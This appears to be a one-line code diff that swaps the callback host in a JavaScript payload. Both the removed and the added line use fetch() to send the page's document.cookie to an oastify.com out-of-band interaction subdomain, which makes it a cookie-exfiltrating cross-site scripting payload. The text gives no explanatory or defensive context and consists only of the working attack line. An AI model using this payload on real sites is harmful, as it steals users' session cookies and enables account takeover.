@@ -1,1 +1,1 @@
-fetch('http://ni9cg17yglarpobpc5zhs4iap1vsjm7b.oastify.com?c=' + document.cookie)
+fetch('http://if17dw4tdg7mmj8k90wcpzf5mwsngi47.oastify.com?c=' + document.cookie)
